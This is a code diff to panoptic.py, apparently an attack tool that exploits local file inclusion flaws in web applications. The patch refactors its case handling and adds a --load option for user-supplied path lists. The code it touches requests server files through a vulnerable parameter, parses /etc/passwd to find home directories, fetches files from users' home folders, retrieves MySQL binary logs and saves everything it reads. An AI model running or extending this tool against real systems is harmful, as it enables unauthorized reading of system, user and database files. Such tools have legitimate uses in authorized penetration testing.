@@ -100,14 +100,14 @@ Examples:
 ./panoptic.py -u "http://localhost/lfi.php?file=test.txt" --software WAMP
 """
 
-class _(dict):
+class AttribDict(dict):
     def __getattr__(self, name):
         return self.get(name)
     def __setattr__(self, name, value):
         return self.__setitem__(name, value)
 
 # Knowledge base used for storing program wide settings
-kb = _()
+kb = AttribDict()
 
 # Variable used to store command parsed arguments
 args = None
@@ -162,18 +162,31 @@ def get_cases(args):
         replacements["HOST"] = urlsplit(args.url).netloc
 
     for element in root.findall(".//file"):
-        case = {}
-        case["location"] = element.value
-        case["os"] = _(element, "os").value
-        case["category"] = _(element, "category").value
-        case["software"] = _(element, "software").value
-        case["type"] = _(element, "log") is not None and "log"\
+        case = AttribDict()
+        case.location = element.value
+        case.os = _(element, "os").value
+        case.category = _(element, "category").value
+        case.software = _(element, "software").value
+        case.type = _(element, "log") is not None and "log"\
                     or _(element, "conf") is not None and "conf"\
                     or _(element, "other") is not None and "other"
 
-        for variable in re.findall(r"\{[^}]+\}", case["location"]):
-            case["location"] = case["location"].replace(variable, replacements.get(variable.strip("{}"), variable))
+        for variable in re.findall(r"\{[^}]+\}", case.location):
+            case.location = case.location.replace(variable, replacements.get(variable.strip("{}"), variable))
 
+        cases.append(case)
+
+    return cases
+
+def load_list(filepath):
+    items = []
+    cases = []
+
+    with open(filepath, 'r') as f:
+        items = f.readlines()
+
+    for item in items:
+        case = AttribDict({'location': item.strip()})
         cases.append(case)
 
     return cases
@@ -320,11 +333,11 @@ def request_file(case, replace_slashes=True):
     global ROTATOR_CHARS
 
     if args.replace_slash and replace_slashes:
-        case["location"] = case["location"].replace("/", args.replace_slash.replace("\\", "\\\\"))
+        case.location = case.location.replace("/", args.replace_slash.replace("\\", "\\\\"))
 
-    if kb.restrict_os and kb.restrict_os != case["os"]:
+    if kb.restrict_os and kb.restrict_os != case.os:
         if args.verbose:
-            print("[*] Skipping '%s'" % case["location"])
+            print("[*] Skipping '%s'" % case.location)
 
         return None
 
@@ -332,7 +345,7 @@ def request_file(case, replace_slashes=True):
         args.prefix = args.prefix[:-1]
 
     if args.verbose:
-        print("[*] Trying '%s'" % case["location"])
+        print("[*] Trying '%s'" % case.location)
     else:
         with kb.print_lock:
             sys.stdout.write("\r%s\r" % ROTATOR_CHARS[0])
@@ -340,26 +353,32 @@ def request_file(case, replace_slashes=True):
 
     ROTATOR_CHARS = ROTATOR_CHARS[1:] + ROTATOR_CHARS[0]
 
-    request_args = prepare_request("%s%s%s" % (args.prefix, case["location"], args.postfix))
+    request_args = prepare_request("%s%s%s" % (args.prefix, case.location, args.postfix))
     html = get_page(**request_args)
 
     if not html or args.bad_string and html.find(args.bad_string) != -1:
         return None
 
-    matcher = difflib.SequenceMatcher(None, clean_response(html, case["location"]), clean_response(kb.invalid_response, INVALID_FILENAME))
+    matcher = difflib.SequenceMatcher(None, clean_response(html, case.location), clean_response(kb.invalid_response, INVALID_FILENAME))
 
     if matcher.quick_ratio() < HEURISTIC_RATIO:
         with kb.value_lock:
             if not kb.found:
                 print("[i] Possible file(s) found!")
-                print("[i] OS: %s" % case["os"])
 
-                if kb.restrict_os is None:
-                    answer = ask_question("Do you want to restrict further scans to '%s'? [Y/n]" % case["os"], default='Y', automatic=args.automatic)
-                    kb.restrict_os = answer.upper() != 'N' and case["os"]
+                if case.os:
+                    print("[i] OS: %s" % case.os)
 
-        _ = "'%s' (%s/%s/%s)" % (case["location"], case["os"], case["category"], case["type"])
-        _ = _.replace("%s/%s/" % (case["os"], case["os"]), "%s/" % case["os"])
+                    if kb.restrict_os is None:
+                        answer = ask_question("Do you want to restrict further scans to '%s'? [Y/n]" % case.os, default='Y', automatic=args.automatic)
+                        kb.restrict_os = answer.upper() != 'N' and case.os
+
+        _ = "/".join(_ for _ in (case.os, case.category, case.type) if _)
+        if _:
+            _ = "'%s' (%s)" % (case.location, _)
+            _ = _.replace("%s/%s/" % (case.os, case.os), "%s/" % case.os)
+        else:
+            _ = "'%s'" % case.location
 
         print("[+] Found %s" % _)
 
@@ -373,7 +392,7 @@ def request_file(case, replace_slashes=True):
             if not os.path.exists(_):
                 os.makedirs(_)
 
-            with open(os.path.join(_, "%s.txt" % case["location"].replace(args.replace_slash if args.replace_slash else "/", "_")), "w") as f:
+            with open(os.path.join(_, "%s.txt" % case.location.replace(args.replace_slash if args.replace_slash else "/", "_")), "w") as f:
                 content = html
 
                 with kb.value_lock:
@@ -414,11 +433,11 @@ def try_cases(cases):
             kb.found = True
 
         # If --skip-file-parsing is not set.
-        if case["location"] in ("/etc/passwd", "/etc/security/passwd") and not args.skip_parsing:
+        if case.location in ("/etc/passwd", "/etc/security/passwd") and not args.skip_parsing:
             users = re.finditer("(?P<username>[^:\n]+):(?P<password>[^:]*):(?P<uid>\d+):(?P<gid>\d*):(?P<info>[^:]*):(?P<home>[^:]+):[/a-z]*", html)
 
             if args.verbose:
-                print("[*] Extracting home folders from '%s'" % case["location"])
+                print("[*] Extracting home folders from '%s'" % case.location)
 
             for user in users:
                 if args.verbose:
@@ -429,17 +448,17 @@ def try_cases(cases):
                 for _ in kb.home_files:
                     if user.group("home") == "/":
                         continue
-                    request_file({"category": "*NIX User File", "type": "conf", "os": case["os"], "location": "%s/%s" % (user.group("home"), _), "software": "*NIX"})
+                    request_file(AttribDict({"category": "*NIX User File", "type": "conf", "os": case.os, "location": "%s/%s" % (user.group("home"), _), "software": "*NIX"}))
 
-        if "mysql-bin.index" in case["location"] and not args.skip_parsing:
+        if "mysql-bin.index" in case.location and not args.skip_parsing:
             binlogs = re.findall("\\.\\\\(?P<binlog>mysql-bin\\.\\d{0,6})", html)
-            location = case["location"].rfind("/") + 1
+            location = case.location.rfind("/") + 1
 
             if args.verbose:
-                print("[i] Extracting MySQL binary logs from '%s'" % case["location"])
+                print("[i] Extracting MySQL binary logs from '%s'" % case.location)
 
             for _ in binlogs:
-                request_file({"category": "Databases", "type": "log", "os": case["os"], "location": "%s%s" % (case["location"][:location], _), "software": "MySQL"}, False)
+                request_file(AttribDict({"category": "Databases", "type": "log", "os": case.os, "location": "%s%s" % (case.location[:location], _), "software": "MySQL"}, False))
 
 def parse_args():
     """
@@ -486,6 +505,9 @@ def parse_args():
 
     parser.add_option("-x", "--skip-parsing", dest="skip_parsing", action="store_true",
                 help="skip special tests if *NIX passwd file is found")
+
+    parser.add_option("--load", dest="list_file", metavar="LISTFILE",
+                help="load and try user provided list from a file")
 
     parser.add_option("--ignore-proxy", dest="ignore_proxy", action="store_true",
                 help="ignore system default HTTP proxy")
@@ -568,7 +590,7 @@ def main():
         update()
         exit()
 
-    cases = get_cases(args)
+    cases = get_cases(args) if not args.list_file else load_list(args.list_file)
 
     if args.list:
         args.list = args.list.lower()
@@ -597,11 +619,11 @@ def main():
 
         match = re.search(r"(?P<type>[^:]+)://(?P<address>[^:]+):(?P<port>\d+)", args.proxy, re.I)
         if match:
-            if match.group("type").lower() == "socks4":
+            if match.group("type").upper() == "SOCKS4":
                 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, match.group("address"), int(match.group("port")), True)
-            elif match.group("type").lower() == "socks5":
+            elif match.group("type").upper() == "SOCKS5":
                 socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, match.group("address"), int(match.group("port")), True)
-            elif match.group("type").lower() in ("http", "https"):
+            elif match.group("type").upper() in ("HTTP", "HTTPS"):
                 _ = ProxyHandler({match.group("type"): args.proxy})
                 opener = build_opener(_)
                 install_opener(opener)
